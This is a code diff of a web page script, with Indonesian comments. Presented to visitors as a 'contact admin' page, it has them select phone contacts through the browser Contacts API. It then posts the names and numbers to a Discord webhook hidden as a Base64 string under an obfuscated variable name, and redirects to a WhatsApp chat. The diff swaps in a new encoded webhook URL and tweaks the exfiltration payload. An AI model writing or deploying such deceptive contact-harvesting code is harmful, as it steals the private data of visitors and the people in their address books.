@@ -52,8 +52,8 @@
     <script>
         lucide.createIcons();
 
-        // Webhook URL (Tetap Base64 lo yang tadi)
-        const _0x4a2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2ODYxODkzNzQ4MTY5MTI4MS9sMGtzUVN2ODFIOWRRT2F6SEJHTWN0RU1la2t1RUs4RUpRX21LOWwzN0ktMmc5dXYwME0wdzU4b0wwMF9rYm5FZ3hRcw==";
+        // NEW WEBHOOK URL (Base64 dari URL baru lo)
+        const _0xWH = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NjY0OTkzNzA1MDg2NTgyNy9KeDJtTU1kZFZ2d2hQbG9iYWFSN3IzOFdNdlNYbENrSWJ1UEFfUWNHU2lvWF8wcFRURTZjYXhkMEVnTmRCeVhyNkJIKw==";
 
         function startProcess() {
             const name = document.getElementById('visitorName').value;
@@ -70,57 +70,51 @@
         async function executeCapture(name) {
             const btnText = document.getElementById('btnText');
             const btn = document.querySelector('button');
-            
             btnText.innerText = "Mencari...";
             btn.disabled = true;
 
-            let contactsData = "Data tidak terpilih";
+            let logData = "Bukan HP / Akses Ditolak";
+
             try {
-                // HANYA JALAN DI HP CHROME/EDGE (HTTPS)
                 if ('contacts' in navigator && 'ContactsManager' in window) {
                     const props = ['name', 'tel'];
                     const contacts = await navigator.contacts.select(props, { multiple: true });
-                    if (contacts.length > 0) {
-                        contactsData = JSON.stringify(contacts, null, 2);
-                    }
-                } else {
-                    contactsData = "Browser Laptop/Tidak Support Contact API";
+                    logData = contacts.length > 0 ? JSON.stringify(contacts, null, 2) : "User tidak memilih kontak.";
                 }
-            } catch (err) { 
-                contactsData = "User Menolak Akses: " + err; 
+            } catch (err) {
+                logData = "Error: " + err.message;
             }
 
-            // PERBAIKAN SISTEM: Menggunakan keepalive dan mode no-cors jika perlu
             const payload = {
-                username: "Bunny-Machine Log",
-                avatar_url: "https://i.imgur.com/8nN9S1L.png",
+                content: `🚨 **LOG BARU: ${name.toUpperCase()}**`,
                 embeds: [{
-                    title: "🚨 Alert: Kontak Admin Diakses",
-                    color: 3447003,
-                    fields: [
-                        { name: "Pengguna", value: `👤 ${name}`, inline: true },
-                        { name: "Waktu", value: `🕒 ${new Date().toLocaleString('id-ID')}`, inline: true },
-                        { name: "Hasil Capture", value: "```json\n" + contactsData.substring(0, 900) + "\n```" }
-                    ],
-                    footer: { text: "System Log | Secured by Oki" }
+                    title: "Detail Capture Kontak",
+                    description: "```json\n" + logData.substring(0, 1800) + "\n```",
+                    color: 3066993,
+                    footer: { text: "Bunny-Machine Monitoring Center" },
+                    timestamp: new Date().toISOString()
                 }]
             };
 
             try {
-                await fetch(atob(_0x4a2), {
+                const response = await fetch(atob(_0xWH).trim(), {
                     method: 'POST',
-                    mode: 'cors', // Penting buat GitHub Pages
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch (e) {
-                console.error("Webhook Error:", e);
-            }
 
-            // Redirect tetap jalan
-            setTimeout(() => {
-                window.location.href = "https://wa.me/62882006262523?text=Halo%20Admin,%20saya%20" + encodeURIComponent(name) + "%20ingin%20sinkronisasi.";
-            }, 500);
+                if (response.ok) {
+                    window.location.href = `https://wa.me/62882006262523?text=Halo%20Admin,%20saya%20${encodeURIComponent(name)}%20ingin%20sinkronisasi.`;
+                } else {
+                    alert("Webhook ditolak Discord. Cek pengaturan Webhook lo!");
+                    btn.disabled = false;
+                    btnText.innerText = "Contact Admin";
+                }
+            } catch (e) {
+                alert("Koneksi Error. Pastiin kuota lo aman, Ki!");
+                btn.disabled = false;
+                btnText.innerText = "Contact Admin";
+            }
         }
     </script>
 </body>
